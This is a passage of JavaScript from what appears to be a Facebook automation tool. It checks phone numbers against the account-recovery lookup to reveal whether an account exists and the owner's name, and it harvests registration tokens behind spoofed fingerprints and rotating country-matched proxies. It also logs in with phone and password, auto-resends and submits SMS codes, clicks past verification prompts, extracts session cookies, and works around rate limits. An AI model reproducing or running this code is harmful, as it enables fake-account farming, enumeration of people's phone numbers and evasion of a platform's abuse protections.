  const lsd = sess.lsd || DEFAULT_FB_LSD;
  const hdrs = {
    'User-Agent': sess.ua || DESKTOP_UA,
    Accept: '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Content-Type': 'application/x-www-form-urlencoded',
    'x-fb-friendly-name': 'CAAFBAccountSearchViewQuery',
    'x-asbd-id': '359341',
    'x-fb-lsd': lsd,
    origin: 'https://www.facebook.com',
    referer: 'https://www.facebook.com/login/identify/',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
  };
  const variables = {
    params: {
      cipher_text: DEFAULT_GQL_CIPHER,
      context: 'recover',
      event_request_id: crypto.randomUUID(),
      friend_name: '',
      search_query: numStr,
      waterfall_id: crypto.randomUUID(),
    },
  };
  const payload = new URLSearchParams({
    av: '0',
    __aaid: '0',
    __user: '0',
    __a: '1',
    __req: '5',
    __hs: sess.hsi || '',
    dpr: '1',
    __ccg: 'EXCELLENT',
    __rev: sess.rev || '1055852612',
    __comet_req: '15',
    lsd,
    jazoest: sess.jazoest || jazoest(lsd) || DEFAULT_GQL_JAZOEST,
    __spin_r: sess.rev || '1055852612',
    __spin_b: sess.spinB || 'trunk',
    __spin_t: sess.spinT || String(Math.floor(Date.now() / 1000)),
    fb_api_caller_class: 'RelayModern',
    fb_api_req_friendly_name: 'CAAFBAccountSearchViewQuery',
    server_timestamps: 'true',
    variables: JSON.stringify(variables),
    doc_id: DEFAULT_GQL_DOC_ID,
  }).toString();

  const jar = { ...(sess.jar || {}) };
  try {
    const res = await fetchWithJar(FB_GRAPHQL_URL, jar, {
      preferCurl: true,
      method: 'POST',
      headers: hdrs,
      body: payload,
      ua: sess.ua || DESKTOP_UA,
      timeoutMs: opts.timeoutMs || 15000,
      proxy: opts.proxy || null,
      strictProxy: opts.strictProxy !== false,
      shouldAbort: opts.shouldAbort,
    });
    if (res.status !== 200) {
      const isRl = res.status === 429;
      return { status: isRl ? 'ratelimit' : 'unknown', nameHint: '', reason: `HTTP ${res.status}` };
    }
    const clean = (res.text || '').trim().replace(/^for\s*\(\s*;\s*;\s*\)\s*;?/, '');
    const js = JSON.parse(clean);
    if (js?.error) {
      if ((js.error === 1357054 || js.error === 1357004) && !opts._retriedSession && !opts.lsd) {
        gqlSessionCache = null;
        return checkNumberGraphql(phoneNumber, { ...opts, forceRefreshSession: true, _retriedSession: true });
      }
      const errMsg = js.errorSummary || js.errorDescription || `FB Err ${js.error}`;
      const isRl = js.error === 1675004 || /too many|rate limit|try again|blocked|temporarily|slow down/i.test(errMsg);
      return {
        status: isRl ? 'ratelimit' : 'unknown',
        nameHint: '',
        reason: errMsg,
      };
    }
    const search = js?.data?.caa_ar_fb_account_search || {};
    const accounts = Array.isArray(search.accounts) ? search.accounts : [];
    const desc = String(search?.error_content?.description || '').trim();
    const descLow = desc.toLowerCase();
    const errStyle = String(search?.error_style || '').toUpperCase();

    if (accounts.length > 0) {
      const hint = String(accounts[0]?.name || '').trim();
      return { status: 'taken', nameHint: hint, reason: `Found ${accounts.length} account(s)` };
    }
    if (
      GQL_NO_ACCOUNT_PATTERNS.some((p) => descLow.includes(p)) ||
      (errStyle === 'INLINE_IDENTIFIER' && !search.redirect_uri && search.num_results_shown === 0)
    ) {
      return { status: 'free', nameHint: '', reason: 'No account found' };
    }
    if (search.redirect_uri && /\/recover/i.test(String(search.redirect_uri))) {
      return { status: 'taken', nameHint: '', reason: 'Recovery match found' };
    }
    if (/too many|rate limit|try again|blocked|temporarily|slow down/i.test(descLow)) {
      return { status: 'ratelimit', nameHint: '', reason: desc.slice(0, 80) };
    }
    if (desc) {
      return { status: 'unknown', nameHint: '', reason: desc.slice(0, 80) };
    }
    return { status: 'unknown', nameHint: '', reason: 'Unrecognized GraphQL response' };
  } catch (err) {
    if (err && err.isProxyError) throw err;
    return {
      status: 'unknown',
      nameHint: '',
      reason: err instanceof Error ? err.message : 'GraphQL failed',
    };
  }
}

async function harvestTokens(cfg, jar, trace, proxy, opts = {}) {
  const timeoutMs = (cfg.timeout || 18) * 1000;
  const px = proxy !== undefined ? proxy : cfg.proxy;
  const strictProxy = cfg.strict_proxy !== false;
  const fp = opts.fp || buildFingerprint(cfg.cc);
  const proxySaver = cfg.proxy_saver !== false && !opts.forceWarmup;
  if (!proxySaver) {
    try {
      await fetchWithJar('https://www.facebook.com/', jar, {
        timeoutMs: Math.min(timeoutMs, 8000),
        proxy: px,
        strictProxy,
        ua: fp.ua,
        headers: { ...fp.headers, 'sec-fetch-site': 'none' },
        shouldAbort: opts.shouldAbort,
      });
    } catch (err) {
      if (err && err.isProxyError) {
        trace.push(`proxy err: ${err.message}`);
        throw err;
      }
    }
  } else if (px) {
    proxyTrafficStats.savedWarmups += 1;
  }

  const hosts = [
    [`${FB_REG_BASE}/reg/?cid=103&refsrc=deprecated&soft=hjk`, 'https://www.facebook.com/', fp.ua, fp.headers],
    ['https://www.facebook.com/r.php?locale=en_US', 'https://www.facebook.com/', DESKTOP_UA, { 'User-Agent': DESKTOP_UA }],
    ['https://m.facebook.com/reg/?cid=103&refid=8', 'https://m.facebook.com/', fp.ua, fp.headers],
  ];

  let fallbackToken = null;

  for (const [url, ref, ua, hdrs] of hosts) {
    if (opts.shouldAbort && opts.shouldAbort()) break;
    const host = new URL(url).host;
    try {
      const r = await fetchWithJar(url, jar, {
        headers: { ...hdrs, Referer: ref },
        timeoutMs: Math.min(timeoutMs, 12000),
        proxy: px,
        strictProxy,
        ua,
        shouldAbort: opts.shouldAbort,
      });
      const html = r.text || '';
      const redirectedIg = (r.url || '').includes('/ig/login_via/');
      const isLimited = host === 'limited.facebook.com';
      const isCometSpa =
        !isLimited &&
        !html.includes('reg_email__') &&
        (html.includes('CAARegistrationFormDesktop') || html.includes('CAAFBRegistrationHomepageRoot'));
      trace.push(`reg ${r.status}/${html.length}B (${host}${redirectedIg ? '->ig' : isCometSpa ? '->comet' : ''})`);
      const { action, inputs, selects } = readForm(html, 'reg');

      const lsd = inputs.lsd?.[1] || tok(html, 'lsd');
      const xrTokens = fromXrefCookie(jar);
      const xref = decodeURIComponent(jar['x-referer'] || '');
      const blob = `${html}\n${decodeURIComponent(r.url || '')}\n${action || ''}\n${xref}`;

      const etok =
        inputs.e_token?.[1] ||
        tok(html, 'e_token') ||
        xrTokens.etok ||
        (blob.match(/(?:^|[^a-zA-Z0-9_])e_token[=":\s]+([A-Za-z0-9_\-]{6,})/)?.[1] ?? '');
      const dhash =
        inputs.d_hash?.[1] ||
        tok(html, 'd_hash') ||
        xrTokens.dhash ||
        (blob.match(/(?:^|[^a-zA-Z0-9_])d_hash[=":\s]+([A-Za-z0-9_\-]{6,})/)?.[1] ?? '');
      const cid =
        inputs.cid?.[1] ||
        tok(html, 'cid') ||
        xrTokens.cid ||
        (blob.match(/cid=(\d+)/)?.[1] ?? '103');
      const regInstance =
        inputs.reg_instance?.[1] ||
        (blob.match(/"reg_instance"\s*:\s*"([A-Za-z0-9_\-]+)"/)?.[1] ?? '');

      const base = `https://${host}`;
      const q = [];
      if (etok) q.push('e_token=' + etok);
      if (dhash) q.push('d_hash=' + dhash);
      if (cid) q.push('cid=' + cid);
      q.push('app_version=310', 'tg=201', 'cct=0', 'src=0', 'soft=hjk');
      const qs = '?' + q.join('&');

      const acts = [];
      if (isLimited) {
        acts.push(`${FB_REG_BASE}/reg/submit/?app_id=103&multi_step_form=1&skip_suma=0&shouldForceMTouch=1`);
      } else {
        if (action) acts.push(action.startsWith('http') ? action : new URL(action, base).toString());
        acts.push(`${base}/reg/submit/${qs}`, `${base}/mreg/submit/${qs}`);
      }

      const candidate = {
        inputs,
        selects,
        actions: Array.from(new Set(acts)),
        base,
        lsd,
        etok,
        dhash,
        cid,
        regInstance,
        ua,
        fp,
        src: url,
        qs,
        isLimited,
        hasClassicForm: html.includes('reg_email__'),
        isCometSpa,
      };

      if (isLimited && r.status < 400 && lsd) {
        trace.push(`limited lsd=${lsd.slice(0, 8)} fp=${fp.model}`);
        return candidate;
      }
      if (html.includes('reg_email__') || (r.status < 400 && !redirectedIg && (regInstance || etok) && lsd)) {
        trace.push(`tok e=${etok ? 'y' : 'n'} d=${dhash ? 'y' : 'n'} ri=${regInstance ? 'y' : 'n'} f=${Object.keys(inputs).length}`);
        return candidate;
      }
      if (!fallbackToken && r.status < 400 && (lsd || etok)) {
        fallbackToken = candidate;
      }
    } catch (err) {
      if (err && err.isProxyError) {
        trace.push(`get ${host} ${err.message}`);
        throw err;
      }
      trace.push(`get ${host} ${err instanceof Error ? err.name : 'Err'}`);
    }
  }
  if (fallbackToken) {
    trace.push(`tok-fallback lsd=${fallbackToken.lsd ? 'y' : 'n'} e=${fallbackToken.etok ? 'y' : 'n'}`);
    return fallbackToken;
  }
  return null;
}

async function trySkip(jar, html, base, timeoutMs, proxy, fp = null) {
  const hdrs = fp ? fp.headers : undefined;
  const ua = fp ? fp.ua : LITE_UA;
  const linkMatches = (html || '').matchAll(/<a[^>]+href=["']([^"']+)["'][^>]*>([\s\S]*?)<\/a>/gi);
  for (const m of linkMatches) {
    const rawUrl = (m[1] || '').replace(/&amp;/g, '&');
    const txt = (m[2] || '').replace(/<[^>]+>/g, ' ').trim().toLowerCase();
    if (!SKIP_HINTS.some((h) => txt.includes(h))) continue;
    try {
      const target = new URL(rawUrl, base).toString();
      await fetchWithJar(target, jar, { timeoutMs, proxy, ua, headers: hdrs });
      if (jar.c_user) return true;
    } catch {
      // continue
    }
  }

  const formMatches = (html || '').matchAll(/<form[^>]*>[\s\S]*?<\/form>/gi);
  for (const fm of formMatches) {
    const block = fm[0];
    if (!/name=["'](skip|not_now|action)["']/i.test(block)) continue;
    const parsed = readForm(block, 'otp');
    if (!parsed.action) continue;
    try {
      const target = new URL(parsed.action, base).toString();
      const data = {};
      for (const [k, v] of Object.entries(parsed.inputs)) {
        data[k] = v[1];
      }
      if (!data.skip) data.skip = '1';
      await fetchWithJar(target, jar, {
        method: 'POST',
        body: new URLSearchParams(data).toString(),
        timeoutMs,
        proxy,
        ua,
        headers: { ...(hdrs || {}), 'Content-Type': 'application/x-www-form-urlencoded' },
      });
      if (jar.c_user) return true;
    } catch {
      // continue
    }
  }
  return false;
}

function extractUidFromHtml(html, url = '') {
  const mUrl = String(url || '').match(/[?&]id=(\d{6,})/);
  if (mUrl) return mUrl[1];
  const mCookie = String(html || '').match(/"c_user"\s*:\s*"?(\d{6,})"?/);
  if (mCookie && mCookie[1] !== '0') return mCookie[1];
  const mJson = String(html || '').match(/"USER_ID"\s*:\s*"(\d{6,})"/);
  if (mJson && mJson[1] !== '0') return mJson[1];
  return '';
}

async function resolveUid(jar, cfg, proxy, fp = null) {
  if (jar.c_user) return jar.c_user;
  const timeoutMs = (cfg.timeout || 35) * 1000;
  const uaMob = fp?.ua || LITE_UA;
  for (const [probeUrl, ua] of [
    [`${FB_REG_BASE}/profile.php`, uaMob],
    ['https://mbasic.facebook.com/profile.php', uaMob],
    ['https://www.facebook.com/me', DESKTOP_UA],
  ]) {
    try {
      const r = await fetchWithJar(probeUrl, jar, {
        timeoutMs,
        proxy,
        strictProxy: cfg.strict_proxy !== false,
        ua,
        headers: fp ? fp.headers : undefined,
      });
      if (jar.c_user) return jar.c_user;
      const uid = extractUidFromHtml(r.text, r.url);
      if (uid) {
        jar.c_user = uid;
        return uid;
      }
    } catch {
      // continue
    }
  }
  return '';
}

async function loginUid(phone, pw, cfg, jar, proxy, fp = null) {
  if (!phone || !pw) {
    return resolveUid(jar, cfg, proxy, fp);
  }
  const timeoutMs = (cfg.timeout || 35) * 1000;
  const strictProxy = cfg.strict_proxy !== false;
  const targets = [
    ['https://m.facebook.com/login/', 'https://m.facebook.com', fp?.ua || LITE_UA],
    ['https://www.facebook.com/login/', 'https://www.facebook.com', DESKTOP_UA],
  ];
  for (const [loginUrl, origin, ua] of targets) {
    try {
      const r = await fetchWithJar(loginUrl, jar, { timeoutMs, proxy, strictProxy, ua });
      const html = r.text || '';
      if ((r.url || '').includes('/unified/login_via/') && !html.includes('name="email"')) {
        continue;
      }
      const lsd = tok(html, 'lsd');
      const parsed = readForm(html, 'reg');
      const data = { email: phone, pass: pw, login: 'Log In' };
      if (lsd) {
        data.lsd = lsd;
        data.jazoest = jazoest(lsd);
      }
      for (const [k, [typ, val]] of Object.entries(parsed.inputs)) {
        if (typ === 'hidden' && !(k in data)) data[k] = val;
      }
      const act =
        parsed.action ||
        (origin.includes('www.')
          ? '/login/device-based/regular/login/?login_attempt=1'
          : '/login/device-based/regular/login/');
      const postUrl = new URL(act, origin).toString();
      const postRes = await fetchWithJar(postUrl, jar, {
        method: 'POST',
        body: new URLSearchParams(data).toString(),
        timeoutMs,
        proxy,
        strictProxy,
        ua,
        headers: {
          Referer: r.url || loginUrl,
          Origin: origin,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
      if (jar.c_user) return jar.c_user;
      const uidFromPost = extractUidFromHtml(postRes.text, postRes.url);
      if (uidFromPost) {
        jar.c_user = uidFromPost;
        return uidFromPost;
      }
    } catch {
      // try next target
    }
  }
  return resolveUid(jar, cfg, proxy, fp);
}

async function performOtpConfirm(item, code, cfg, baseCookieOverride) {
  const baseJar = parseCookieHeader(baseCookieOverride || '');
  const jar = { ...baseJar, ...(item.cookies || {}) };
  let px = (item.proxy || cfg.proxy || '').trim() || null;
  const strictProxy = cfg.strict_proxy !== false;
  const ua = item.ua || LITE_UA;
  let confirmUrl = item.confirm_url || `${FB_REG_BASE}/confirmphone.php`;
  let act = item.action || '';
  let flds = { ...(item.fields || {}) };
  const timeoutMs = ((cfg.timeout || 35) + 5) * 1000;

  const safeConfirmFetch = async (url, fOpts = {}) => {
    try {
      return await fetchWithJar(url, jar, { ...fOpts, timeoutMs, proxy: px, strictProxy, ua });
    } catch (err) {
      if (err && err.isProxyError && /407/.test(err.message || '') && cfg.proxy && px !== cfg.proxy) {
        dynamicProxyTagBlacklist.add(proxyHealthKey(cfg.proxy));
        px = cfg.proxy;
        item.proxy = cfg.proxy;
        return await fetchWithJar(url, jar, { ...fOpts, timeoutMs, proxy: px, strictProxy, ua });
      }
      throw err;
    }
  };

  if (!act && /\/reg\/submit\//i.test(confirmUrl) && !jar.c_user) {
    return { status: 'FAIL', err: 'Incomplete/failed signup session (no real Facebook confirm form)' };
  }

  if (!act) {
    try {
      const r = await safeConfirmFetch(confirmUrl);
      confirmUrl = r.url || confirmUrl;
      const parsed = readForm(r.text || '', 'otp');
      act = parsed.action;
      flds = Object.fromEntries(Object.entries(parsed.inputs).map(([k, v]) => [k, v[1]]));
      if (!act && (confirmUrl.includes('/unified/login_via/') || confirmUrl.includes('/login'))) {
        return { status: 'FAIL', err: 'Session expired or not logged in for OTP confirmation' };
      }
    } catch (err) {
      return { status: 'FAIL', err: err instanceof Error ? err.message : 'Network error' };
    }
  }

  if (!act || /\/reg\/submit\//i.test(act)) {
    return { status: 'FAIL', err: 'no confirm form' };
  }

  let resolvedAct;
  let baseOrigin;
  try {
    resolvedAct = new URL(act, confirmUrl).toString();
    baseOrigin = new URL(resolvedAct).origin;
  } catch {
    return { status: 'FAIL', err: 'Invalid confirm form action URL' };
  }
  const fld = OTP_FIELDS.find((k) => k in flds) || 'code';
  if (code) {
    flds[fld] = code;
  }

  let r;
  try {
    r = await safeConfirmFetch(resolvedAct, {
      method: 'POST',
      body: new URLSearchParams(flds).toString(),
      headers: {
        Referer: confirmUrl,
        Origin: baseOrigin,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
  } catch (err) {
    return { status: 'FAIL', err: err instanceof Error ? err.message : 'Post failed' };
  }

  const body = r.text || '';
  const visibleLow = extractVisibleText(body).toLowerCase();
  if (jar.c_user && jar.xs) {
    return { status: 'OK', uid: jar.c_user, cookies: orderCookies(jar) };
  }
  const directUid = extractUidFromHtml(body, r.url);
  if (directUid && jar.xs) {
    jar.c_user = directUid;
    return { status: 'OK', uid: directUid, cookies: orderCookies(jar) };
  }
  if (WRONG_CODE_WORDS.some((w) => visibleLow.includes(w))) {
    return { status: 'WRONG' };
  }

  if (cfg.skip_probe) {
    const skippedOk = await trySkip(jar, body, baseOrigin, timeoutMs, px);
    if (skippedOk && jar.c_user) {
      return { status: 'OK', uid: jar.c_user, cookies: orderCookies(jar) };
    }
  }

  const nextForm = readForm(body, 'otp');
  if (
    nextForm.action &&
    !/\/reg\/submit\//i.test(nextForm.action) &&
    (nextForm.action.toLowerCase().includes('confirm') || (r.url || '').toLowerCase().includes('checkpoint'))
  ) {
    item.action = nextForm.action;
    item.fields = Object.fromEntries(Object.entries(nextForm.inputs).map(([k, v]) => [k, v[1]]));
    item.cookies = orderCookies(jar);
    item.confirm_url = r.url || confirmUrl;
    return { status: 'RETRY', item };
  }
  if ((r.url || '').toLowerCase().includes('/checkpoint')) {
    item.cookies = orderCookies(jar);
    item.confirm_url = r.url || confirmUrl;
    return { status: 'RETRY', item };
  }

  const resolved = await resolveUid(jar, cfg, px);
  if (resolved) {
    return { status: 'OK', uid: resolved, cookies: orderCookies(jar) };
  }

  return { status: 'FAIL', err: 'confirm rejected' };
}

function decodeHtmlAttrs(s) {
  return String(s || '')
    .replace(/&amp;/gi, '&')
    .replace(/&quot;/gi, '"')
    .replace(/&#0*39;|&apos;/gi, "'")
    .replace(/&lt;/gi, '<')
    .replace(/&gt;/gi, '>');
}

function extractOtpResendTargets(html, baseUrl) {
  const signals = extractFbResponseSignals(html || '');
  const fullHtml = `${String(html || '')}\n${signals.decodedHtml || ''}`;
  const seenUrls = new Set();
  const seenForms = new Set();
  const links = [];
  const forms = [];
  const hasOtpInput = OTP_FIELDS.some((f) => new RegExp(`name=["']${f}["']`, 'i').test(fullHtml));

  const badTargetRe = /\b(voice|call|phone_call|whatsapp|change_contact|change_number|edit_phone|update_phone|logout|cancel|sign\s*out|use\s*email)\b/i;
  const resendHrefRe = /(?:confirm(?:phone|email|_code)?\/resend|resend_code|resend_sms|send_again|confirmphone\.php[^"']*resend|[?&](?:resend|send_again)=(?:1|true))/i;
  const resendTextRe = /(?:resend|send\s+(?:the\s+)?(?:code|sms|otp)\s*again|get\s+(?:a\s+)?new\s+(?:code|sms)|another\s+code|send\s+new\s+code|didn['’]t\s+(?:get|receive))/i;
  const initialSmsTextRe = /(?:send\s+(?:sms|code|otp)|get\s+code|text\s+me|receive\s+(?:sms|code)|continue)/i;

  const resolveSafe = (rawHref) => {
    const clean = decodeHtmlAttrs(rawHref).trim();
    if (!clean || clean.startsWith('#') || /^(?:javascript|mailto|tel):/i.test(clean)) return '';
    try {
      return new URL(clean, baseUrl).toString();
    } catch {
      return '';
    }
  };

  for (const m of fullHtml.matchAll(/<a\b[^>]*href=["']([^"']+)["'][^>]*>([\s\S]*?)<\/a>/gi)) {
    const url = resolveSafe(m[1]);
    if (!url) continue;
    const text = decodeHtmlAttrs(m[2].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());
    if (badTargetRe.test(url) || badTargetRe.test(text)) continue;
    const hrefMatch = resendHrefRe.test(url);
    const textMatch = resendTextRe.test(text);
    const initMatch = !hasOtpInput && initialSmsTextRe.test(text) && /confirm|checkpoint|recover/i.test(url);
    if (hrefMatch || textMatch || initMatch) {
      if (!seenUrls.has(url)) {
        seenUrls.add(url);
        links.push({
          url,
          label: text || 'Resend link',
          score: (hrefMatch ? 3 : 0) + (textMatch ? 2 : 0) + (initMatch ? 1 : 0),
        });
      }
    }
  }

  // Also check ajaxify / data-href / data-uri attributes used on mobile touch buttons/anchors
  for (const m of fullHtml.matchAll(/\b(?:ajaxify|data-ajaxify|data-href|data-uri)=["']([^"']+)["']/gi)) {
    const url = resolveSafe(m[1]);
    if (!url || badTargetRe.test(url)) continue;
    if (resendHrefRe.test(url) && !seenUrls.has(url)) {
      seenUrls.add(url);
      links.push({ url, label: 'Mobile resend endpoint', score: 3 });
    }
  }

  for (const uri of signals.redirectUris || []) {
    if (resendHrefRe.test(uri) && !badTargetRe.test(uri)) {
      const url = resolveSafe(uri);
      if (url && !seenUrls.has(url)) {
        seenUrls.add(url);
        links.push({ url, label: 'Resend redirect', score: 2 });
      }
    }
  }

  const formBlocks = fullHtml.match(/<form\b[^>]*>[\s\S]*?<\/form>/gi) || [];
  for (const blk of formBlocks) {
    const actMatch = blk.match(/action=["']([^"']+)["']/i);
    const action = resolveSafe(actMatch ? actMatch[1] : baseUrl);
    if (!action || /\/reg\/submit\//i.test(action)) continue;

    const actionIsResend = resendHrefRe.test(action);
    const hiddenFields = {};
    const submitCandidates = [];

    for (const tag of blk.match(/<input\b[^>]*>/gi) || []) {
      const nM = tag.match(/name=["']([^"']+)["']/i);
      if (!nM) continue;
      const name = decodeHtmlAttrs(nM[1]);
      const tM = tag.match(/type=["']([^"']+)["']/i);
      const vM = tag.match(/value=["']([^"']*)["']/i);
      const itype = tM ? tM[1].toLowerCase() : 'text';
      const ival = vM ? decodeHtmlAttrs(vM[1]) : '';
      if (itype === 'hidden') {
        hiddenFields[name] = ival;
      } else if (itype === 'submit' || itype === 'button') {
        submitCandidates.push({ name, value: ival, label: `${name} ${ival}` });
      }
    }

    for (const bm of blk.matchAll(/<button\b([^>]*)>([\s\S]*?)<\/button>/gi)) {
      const attrs = bm[1] || '';
      const inner = decodeHtmlAttrs(bm[2].replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim());
      const nM = attrs.match(/name=["']([^"']+)["']/i);
      const vM = attrs.match(/value=["']([^"']*)["']/i);
      const tM = attrs.match(/type=["']([^"']+)["']/i);
      const btype = tM ? tM[1].toLowerCase() : 'submit';
      if (btype === 'reset') continue;
      submitCandidates.push({
        name: nM ? decodeHtmlAttrs(nM[1]) : '',
        value: vM ? decodeHtmlAttrs(vM[1]) : inner || '1',
        label: inner || (nM ? nM[1] : '') || (vM ? vM[1] : ''),
      });
    }

    const matchingSub = submitCandidates.find((s) => {
      if (badTargetRe.test(s.label)) return false;
      if (resendTextRe.test(s.label) || /\bresend\b|send_again|submit\[resend\]/i.test(s.label)) return true;
      if (!hasOtpInput && initialSmsTextRe.test(s.label) && /confirm|checkpoint/i.test(action)) return true;
      return false;
    });

    if (actionIsResend || matchingSub) {
      const fields = { ...hiddenFields };
      if (matchingSub && matchingSub.name) {
        fields[matchingSub.name] = matchingSub.value;
      } else if (!actionIsResend) {
        continue;
      }
      const sig = `${action}:${Object.keys(fields).sort().join(',')}`;
      if (!seenForms.has(sig)) {
        seenForms.add(sig);
        forms.push({
          action,
          fields,
          label: matchingSub?.label || 'Resend form',
          score: (actionIsResend ? 3 : 0) + (matchingSub ? 2 : 0),
        });
      }
    }
  }

  links.sort((a, b) => b.score - a.score);
  forms.sort((a, b) => b.score - a.score);
  return { links, forms, hasOtpInput };
}

async function performOtpResendOnce(item, cfg, baseCookieOverride, opts = {}) {
  const baseJar = parseCookieHeader(baseCookieOverride || '');
  const jar = { ...baseJar, ...(item.cookies || {}) };
  const strictProxy = cfg.strict_proxy !== false;
  const ua = item.ua || LITE_UA;
  const timeoutMs = ((cfg.timeout || 25) + 5) * 1000;

  const numDet = detectCountryFromNumber(`+${item.phone}`, cfg.cc, item.country || '');
  const effectiveIso = item.iso || item.proxyIso || (numDet?.iso && numDet.iso !== '??' ? numDet.iso : getCountryInfo(cfg.cc)[1]);
  let px = (item.proxy || '').trim() || null;
  if (!px && cfg.proxy) {
    const adapted = adaptProxyForSession(cfg.proxy, {
      iso: effectiveIso,
      autoCountry: cfg.auto_proxy_country !== false,
      refreshSession: cfg.auto_proxy_refresh !== false,
      forcedSessionId: item.proxySession || undefined,
    });
    px = adapted.url;
    if (px) item.proxy = px;
  }

  let confirmUrl = item.confirm_url || `${FB_REG_BASE}/confirmphone.php`;
  let html = opts.html || item._lastConfirmHtml || '';

  const safeFetch = async (url, fOpts = {}) => {
    try {
      return await fetchWithJar(url, jar, {
        ...fOpts,
        timeoutMs,
        proxy: px,
        strictProxy,
        ua,
        shouldAbort: opts.shouldAbort,
      });
    } catch (err) {
      if (err && err.isProxyError && /407/.test(err.message || '') && cfg.proxy && px !== cfg.proxy) {
        dynamicProxyTagBlacklist.add(proxyHealthKey(cfg.proxy));
        px = cfg.proxy;
        item.proxy = cfg.proxy;
        return await fetchWithJar(url, jar, {
          ...fOpts,
          timeoutMs,
          proxy: px,
          strictProxy,
          ua,
          shouldAbort: opts.shouldAbort,
        });
      }
      throw err;
    }
  };

  if (!html) {
    try {
      const rGet = await safeFetch(confirmUrl);
      confirmUrl = rGet.url || confirmUrl;
      html = rGet.text || '';
      if (rGet.status >= 400) {
        return { ok: false, reason: `HTTP ${rGet.status} loading confirm page`, item };
      }
    } catch (err) {
      return { ok: false, reason: err instanceof Error ? err.message : 'Failed loading confirm page', item };
    }
  }

  let targets = extractOtpResendTargets(html, confirmUrl);

  // If limited.facebook.com didn't expose HTML resend controls, probe m.facebook.com / mbasic with same cookies & sticky proxy
  if (targets.forms.length === 0 && targets.links.length === 0) {
    for (const host of ['https://m.facebook.com', 'https://mbasic.facebook.com']) {
      if (opts.shouldAbort && opts.shouldAbort()) break;
      try {
        const parsedCur = new URL(confirmUrl);
        if (parsedCur.origin === host) continue;
        const altUrl = `${host}${parsedCur.pathname}${parsedCur.search}`;
        const rAlt = await safeFetch(altUrl, { headers: { Referer: confirmUrl } });
        if (rAlt.status < 400 && (rAlt.text || '').length > 200) {
          const altTargets = extractOtpResendTargets(rAlt.text || '', rAlt.url || altUrl);
          if (altTargets.forms.length > 0 || altTargets.links.length > 0) {
            html = rAlt.text || html;
            confirmUrl = rAlt.url || altUrl;
            targets = altTargets;
            break;
          }
        }
      } catch {
        // try next fallback host
      }
    }
  }

  let rResend = null;
  let usedMethod = '';
  try {
    if (targets.forms.length > 0) {
      const f = targets.forms[0];
      usedMethod = `POST(${f.label.slice(0, 28)})`;
      const baseOrigin = new URL(f.action).origin;
      rResend = await safeFetch(f.action, {
        method: 'POST',
        body: new URLSearchParams(f.fields).toString(),
        headers: {
          Referer: confirmUrl,
          Origin: baseOrigin,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
    } else if (targets.links.length > 0) {
      const l = targets.links[0];
      usedMethod = `GET(${l.label.slice(0, 28)})`;
      rResend = await safeFetch(l.url, { headers: { Referer: confirmUrl } });
    } else {
      // Final safe attempt: explicit resend query param if on confirmphone.php
      const parsedCur = new URL(confirmUrl);
      if (/confirmphone\.php|confirm_code/i.test(parsedCur.pathname)) {
        parsedCur.searchParams.set('resend', '1');
        usedMethod = 'GET(confirm?resend=1)';
        rResend = await safeFetch(parsedCur.toString(), { headers: { Referer: confirmUrl } });
      } else {
        return { ok: false, reason: 'No resend link/form found on confirmation page', item };
      }
    }
  } catch (err) {
    return { ok: false, reason: err instanceof Error ? err.message : 'Resend request failed', item };
  }

  const resBody = rResend?.text || '';
  const resUrl = rResend?.url || confirmUrl;
  if (rResend.status >= 400) {
    return { ok: false, reason: `Resend HTTP ${rResend.status}`, item };
  }

  if (jar.c_user && jar.xs) {
    return {
      ok: true,
      alreadyConfirmed: true,
      uid: jar.c_user,
      cookies: orderCookies(jar),
      via: usedMethod,
      item,
    };
  }
  const directUid = extractUidFromHtml(resBody, resUrl);
  if (directUid && jar.xs) {
    jar.c_user = directUid;
    return {
      ok: true,
      alreadyConfirmed: true,
      uid: directUid,
      cookies: orderCookies(jar),
      via: usedMethod,
      item,
    };
  }

  const signals = extractFbResponseSignals(resBody);
  const visLow = `${signals.errTexts.join(' ')} ${signals.visibleText}`.toLowerCase();
  if (
    visLow.includes('wait a few minutes') ||
    visLow.includes('too many codes') ||
    visLow.includes('too many attempts') ||
    visLow.includes('rate limit') ||
    visLow.includes('try again later')
  ) {
    return {
      ok: false,
      rateLimited: true,
      reason: signals.errTexts[0]?.slice(0, 100) || 'Facebook asked to wait before another resend',
      item,
    };
  }

  item.cookies = orderCookies(jar);
  item.confirm_url = resUrl;
  item._lastConfirmHtml = resBody;
  if (px) item.proxy = px;

  const refreshedForm = readForm(signals.decodedHtml, 'otp');
  if (
    refreshedForm.action &&
    !/\/reg\/submit\//i.test(refreshedForm.action) &&
    (OTP_FIELDS.some((k) => k in refreshedForm.inputs) || /confirm(?:phone|email|_code)|checkpoint/i.test(refreshedForm.action))
  ) {
    item.action = refreshedForm.action;
    item.fields = Object.fromEntries(Object.entries(refreshedForm.inputs).map(([k, v]) => [k, v[1]]));
  }
  const newLsd = tok(resBody, 'lsd');
  if (newLsd && item.fields) {
    item.fields.lsd = newLsd;
    item.fields.jazoest = tok(resBody, 'jazoest') || jazoest(newLsd);
  }

  item.resendCount = Number(item.resendCount || 0) + 1;
  item.lastResendAt = Date.now();

  return {
    ok: true,
    alreadyConfirmed: false,
    via: usedMethod,
    confirmUrl: item.confirm_url,
    resendCount: item.resendCount,
    item,
  };
}

async function performAutoOtpResends(item, cfg, baseCookieOverride, opts = {}) {
  const totalRounds = opts.rounds !== undefined
    ? Math.max(0, Math.min(3, Number(opts.rounds)))
    : Math.max(0, Math.min(3, Number(cfg.auto_otp_resend ?? 2)));
  let curItem = { ...item };
  let count = 0;
  const logs = [];

  if (totalRounds <= 0) {
    return { count: 0, alreadyConfirmed: false, item: curItem, logs };
  }

  const delays = [950, 1900, 2200];
  for (let round = 1; round <= totalRounds; round++) {
    if (opts.shouldAbort && opts.shouldAbort()) break;
    const waitMs = delays[Math.min(round - 1, delays.length - 1)];
    const okSleep = await sleepAbort(waitMs, opts.shouldAbort);
    if (!okSleep) break;
    if (opts.shouldAbort && opts.shouldAbort()) break;

    const stepRes = await performOtpResendOnce(curItem, cfg, baseCookieOverride, opts);
    if (stepRes.item) curItem = stepRes.item;

    if (stepRes.alreadyConfirmed) {
      count += 1;
